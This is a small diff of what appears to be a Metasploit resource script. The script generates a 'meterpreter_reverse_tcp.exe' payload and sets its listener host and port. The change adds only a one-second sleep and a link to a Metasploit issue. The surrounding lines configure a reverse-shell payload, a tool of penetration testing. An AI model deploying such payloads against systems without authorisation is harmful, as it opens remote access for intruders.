@@ -13,6 +13,10 @@ def out_path
   "#{Msf::Config::local_directory}/meterpreter_reverse_tcp.exe"
 end
 
+# Please see:
+# https://github.com/rapid7/metasploit-framework/issues/7603
+sleep(1)
+
 run_single("use payload/#{PAYLOAD}")
 run_single("set lhost #{payload_lhost}")
 run_single("set lport #{payload_lport}")
